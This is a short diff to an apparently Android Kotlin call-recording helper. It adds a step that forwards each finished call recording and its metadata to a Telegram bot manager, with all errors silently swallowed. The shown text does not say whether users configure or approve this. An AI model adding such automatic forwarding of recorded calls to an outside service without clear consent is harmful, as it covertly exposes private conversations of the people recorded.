@@ -360,6 +360,11 @@ object CallRecorderHelper {
         if (savedFile != null) {
             LogCat.d("CallRecorder finished → ${savedFile?.absolutePath} (${meta?.durationMs}ms src=${meta?.audioSource} sp=${meta?.speakerphoneForced})")
             publishRecordingsChanged()
+            val f = savedFile
+            val m = meta
+            if (f != null && m != null) {
+                try { com.ismartcoding.plain.telegram.TelegramBotManager.forwardCallRecording(f, m) } catch (_: Throwable) {}
+            }
         }
         publishState()
     }
